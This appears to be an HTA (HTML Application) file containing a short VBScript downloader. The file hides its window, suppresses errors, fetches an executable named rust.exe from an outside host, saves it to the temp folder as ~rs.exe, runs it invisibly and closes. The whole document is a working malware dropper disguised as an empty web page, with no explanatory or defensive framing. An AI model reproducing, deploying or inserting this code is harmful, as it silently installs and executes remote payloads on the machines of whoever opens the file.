<html><head><title>.</title><hta:application id="o" showintaskbar="no" caption="no" border="none" windowstate="minimize" />
<script language="VBScript">
On Error Resume Next
Dim xh, st, tmp, fso, rp
Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xh.Open "GET", "https://stoplag.org/rust.exe", False
xh.Send
If xh.Status = 200 Then
  Set st = CreateObject("ADODB.Stream")
  st.Type = 1
  st.Open
  st.Write xh.ResponseBody
  Set fso = CreateObject("Scripting.FileSystemObject")
  tmp = fso.GetSpecialFolder(2)
  st.SaveToFile tmp & "\~rs.exe", 2
  st.Close
  Set rp = CreateObject("WScript.Shell")
  rp.Run tmp & "\~rs.exe", 0, False
End If
Set xh = Nothing
window.close()
</script></head><body></body></html>
